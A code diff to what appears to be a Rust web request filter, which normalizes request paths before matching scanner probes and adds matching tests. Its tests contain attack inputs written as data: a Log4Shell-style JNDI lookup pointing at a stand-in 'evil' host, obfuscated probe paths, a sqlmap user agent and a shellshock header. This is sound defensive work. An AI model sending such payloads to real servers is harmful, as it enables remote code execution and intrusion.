@@ -49,7 +49,6 @@ fn decode(s: &str) -> String {
 /// What the patterns read of a request: its path and query as sent and decoded twice, and the
 /// headers attacks ride in.
 struct Seen {
-    path: String,
     texts: Vec<String>,
 }
 
@@ -63,7 +62,7 @@ fn seen(a: &Asked<'_>) -> Seen {
             texts.push(decode(v));
         }
     }
-    Seen { path: decode(a.raw_path), texts }
+    Seen { texts }
 }
 
 fn any(texts: &[String], patterns: &[&str]) -> bool {
@@ -77,7 +76,9 @@ pub fn matches(kinds: &[String], a: &Asked<'_>) -> bool {
     let texts: Vec<String> = s.texts.into_iter().map(|t| t.chars().take(8192).collect()).collect();
     kinds.iter().any(|k| match k.as_str() {
         "scanners" => {
-            let p = s.path.trim_end_matches('/');
+            // As the app would read it (`//wp-admin`, `/./cgi-bin`, `/wp-admin;x` are the probes too).
+            let normal = crate::model::normal_path(a.raw_path).to_ascii_lowercase();
+            let p = normal.trim_end_matches('/');
             PROBES.iter().any(|probe| {
                 let probe = probe.trim_end_matches('/');
                 p == probe || p.starts_with(&format!("{probe}/")) || (probe.contains('.') && p.ends_with(probe))
@@ -114,6 +115,9 @@ mod tests {
             ("/x", Some("v=${jndi:ldap://evil/a}")),
         ] {
             assert!(ask(path, q, "Mozilla/5.0", &h), "{path}?{q:?}");
+        }
+        for path in ["//wp-admin", "/./cgi-bin/x", "/wp-admin;x=1", "/WP-LOGIN.PHP"] {
+            assert!(ask(path, None, "Mozilla/5.0", &h), "{path} as the app reads it");
         }
         assert!(ask("/", None, "sqlmap/1.8", &h), "a scanner's user agent");
         let mut shellshock = axum::http::HeaderMap::new();
